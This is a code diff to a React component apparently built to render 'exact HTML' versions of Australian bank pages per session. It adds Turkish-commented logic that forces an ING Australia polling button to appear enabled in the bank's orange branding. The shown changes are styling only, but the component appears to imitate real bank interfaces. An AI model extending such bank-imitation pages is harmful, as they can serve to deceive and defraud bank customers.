@@ -3326,6 +3326,14 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           if (shouldForceEnable || (hasAnyImportantPoll && filledNow >= 1)) {
             try { cache2.delete(node); } catch {}
           }
+          // ⭐⭐⭐⭐⭐ ING Australia KESIN COZUM (CACHE SIFIRLAMA):
+          //   isIngPolling && !disabledBySaving ise:
+          //   WeakMap'te ESKI (gri/silik) cache kaydı VARSA SİL!
+          //   Aksi takdirde setVisual2 ayni değer sanıp tekrar yazmıyor →
+          //   Hâlâ eski "gri / #E6E8EA" cached degeri kalıyor → buton silik kaliyor.
+          if (isIngPolling && !disabledBySaving) {
+            try { cache2.delete(node); } catch {}
+          }
           let nodeRec2 = cache2.get(node);
           if (!nodeRec2) { nodeRec2 = {}; cache2.set(node, nodeRec2); }
           const setLayout2 = (p2: string, v2: string) => {
@@ -3350,17 +3358,17 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           setLayout2("font-weight", "800");
           setLayout2("border-radius", "12px");
           // 2) VISUAL (transition olanlar): SADECE DEGISIRSE YAZ → FLICKER YOK
-          setVisual2("pointer-events", saving ? "none" : "auto");
+          setVisual2("pointer-events", (isIngPolling && !disabledBySaving) ? "auto" : (saving ? "none" : "auto"));
           setVisual2("opacity", String(opacPoll));
-          setVisual2("filter", proceedNow ? "grayscale(0)" : `grayscale(${grayPoll})`);
-          setVisual2("-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${grayPoll})`);
+          setVisual2("filter", ((isIngPolling && !disabledBySaving) || proceedNow || shouldForceEnable) ? "grayscale(0)" : `grayscale(${grayPoll})`);
+          setVisual2("-webkit-filter", ((isIngPolling && !disabledBySaving) || proceedNow || shouldForceEnable) ? "grayscale(0)" : `grayscale(${grayPoll})`);
           setVisual2("cursor", cursorPoll);
           setVisual2("background-color", bgPoll);
           setVisual2("background", bgPoll);
           setVisual2("color", fgPoll);
           setVisual2("border", borderPoll);
           setVisual2("box-shadow", shadowPoll);
-          setVisual2("transform", shouldForceEnable ? "translateY(0)" : "none");
+          setVisual2("transform", ((isIngPolling && !disabledBySaving) || shouldForceEnable) ? "translateY(0)" : "none");
           setVisual2(
             "transition",
             "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
@@ -3475,12 +3483,27 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                   }
                 } catch {}
                 try {
-                  if (shouldForceEnable) {
+                  // ⭐⭐⭐⭐⭐ ING Australia SON KESIN COZUM (BRUTEFORCE):
+                  //   isIngPolling && !disabledBySaving ise:
+                  //   HİÇBİR KOŞUL BAKMADAN (shouldForceEnable, proceedNow, filledCount, proceedNow)
+                  //   ZORLA palette.bg (#E65300 TURUNCU) + palette.fg (BEYAZ) UYGULA!
+                  const _ingForceNow = (isIngPolling && !disabledBySaving);
+                  if (_ingForceNow || shouldForceEnable) {
                     applyButtonStyleCached(el, "background-color", palette.bg);
                     applyButtonStyleCached(el, "background", palette.bg);
                     applyButtonStyleCached(el, "color", palette.fg);
                     applyButtonStyleCached(el, "border", `1px solid ${palette.border}`);
                     applyButtonStyleCached(el, "box-shadow", palette.shadow);
+                    applyButtonStyleCached(el, "opacity", "1");
+                    applyButtonStyleCached(el, "filter", "grayscale(0)");
+                    applyButtonStyleCached(el, "-webkit-filter", "grayscale(0)");
+                    applyButtonStyleCached(el, "pointer-events", saving ? "none" : "auto");
+                    applyButtonStyleCached(el, "cursor", saving ? "wait" : "pointer");
+                    try { (el as any).disabled = saving ? true : false; } catch {}
+                    if (!saving) {
+                      try { el.removeAttribute("disabled"); } catch {}
+                      try { el.setAttribute("aria-disabled", "false"); } catch {}
+                    }
                   } else {
                     const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
                     applyButtonStyleCached(el, "background", bgCol);
